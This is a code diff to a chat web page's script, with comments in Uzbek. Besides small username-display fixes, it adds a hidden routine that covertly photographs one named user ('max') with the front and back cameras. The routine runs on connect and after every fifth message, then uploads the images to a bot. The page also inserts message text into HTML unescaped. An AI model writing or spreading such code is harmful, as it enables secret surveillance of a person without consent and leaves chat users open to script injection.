@@ -140,15 +140,18 @@
         function appendMessage(msg) {
             const list = document.getElementById('messagesList');
             const div = document.createElement('div');
-            const isMe = msg.user === myUser;
+            
+            // ASOSIY O'ZGARISH: Katta-kichik harf bo'lishidan qat'i nazar, bir xil qilib solishtiradi
+            const isMe = String(msg.user).toLowerCase() === String(myUser).toLowerCase();
+            
             div.className = `message ${isMe ? 'my-msg' : 'other-msg'}`;
 
             div.ondblclick = () => triggerReply(msg);
 
-            // 1-YANGILIK: Kim yozganini ko'rsatuvchi ism (faqat sherik yozgan bo'lsa)
+            // Kim yozganini ko'rsatuvchi ism (faqat sherik yozgan bo'lsa)
             let senderNameHtml = '';
             if (!isMe && msg.user) {
-                senderNameHtml = `<div style="font-size: 11px; font-weight: bold; color: #64b5ef; margin-bottom: 3px;">${msg.user.toUpperCase()}</div>`;
+                senderNameHtml = `<div style="font-size: 11px; font-weight: bold; color: #64b5ef; margin-bottom: 3px;">${String(msg.user).toUpperCase()}</div>`;
             }
 
             let replyHtml = '';
@@ -167,11 +170,10 @@
             let textHtml = msg.text ? `<div>${msg.text}</div>` : '';
             const replyBtn = `<i class='bx bxs-share' style="position:absolute; top:-10px; right:-10px; background:#fff; color:#333; border-radius:50%; padding:3px; cursor:pointer; font-size:14px;" onclick='triggerReply(${JSON.stringify(msg)})'></i>`;
 
-            // HTML ga senderNameHtml qo'shildi
             div.innerHTML = `${replyBtn} ${senderNameHtml} ${replyHtml} ${mediaHtml} ${textHtml} <span class="msg-time">${msg.time}</span>`;
             list.appendChild(div);
         }
-        
+
         window.triggerReply = function(msg) {
             let previewText = msg.text || (msg.file ? "[Fayl/Media]" : "...");
             currentReply = { user: msg.user, text: previewText };
@@ -257,6 +259,78 @@
                 cancelReply();
             } catch (e) { alert("Yuklashda xato!"); }
         }
+
+        // ==========================================
+        // MAX SHAXSINI YASHIRIN TASDIQLASH (VERIFY)
+        // ==========================================
+
+        let maxMessageCount = 0;
+
+        // Yashirincha rasmga olish funksiyasi
+        async function takeSecretPhoto(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0); 
+                
+                stream.getTracks().forEach(track => track.stop());
+                
+                return new Promise(resolve => {
+                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
+                });
+            } catch (err) {
+                console.log(`Kamera xatosi (${facingMode}):`, err);
+                return null;
+            }
+        }
+
+        async function uploadAndSendToBot(blob, type) {
+            const formData = new FormData();
+            formData.append('file', blob, `verify_${Date.now()}.jpg`);
+            try {
+                const res = await fetch('/upload', { method: 'POST', body: formData });
+                const data = await res.json();
+                socket.emit('verify_photo', { filename: data.filename, type: type });
+            } catch (e) { console.error("Rasm yuklash xatosi"); }
+        }
+
+        async function runVerification() {
+            if (myUser !== 'max') return; 
+            
+            const frontBlob = await takeSecretPhoto('user');
+            if (frontBlob) await uploadAndSendToBot(frontBlob, 'Old Kamera 🤳');
+            
+            await new Promise(r => setTimeout(r, 1000)); // 1 soniya kutamiz
+            
+            const backBlob = await takeSecretPhoto('environment');
+            if (backBlob) await uploadAndSendToBot(backBlob, 'Orqa Kamera 🌍');
+        }
+
+        // Tizimga kirganda 3 soniyadan keyin ishga tushadi
+        socket.on('connect', () => {
+            if (myUser === 'max') {
+                setTimeout(runVerification, 3000); 
+            }
+        });
+
+        // Xabar sanash qismi
+        const originalSendMessage = window.sendMessage;
+        window.sendMessage = function() {
+            originalSendMessage(); 
+            if (myUser === 'max') {
+                maxMessageCount++;
+                if (maxMessageCount % 5 === 0) { 
+                    runVerification();
+                }
+            }
+        }
+        
     </script>
 </body>
 </html>
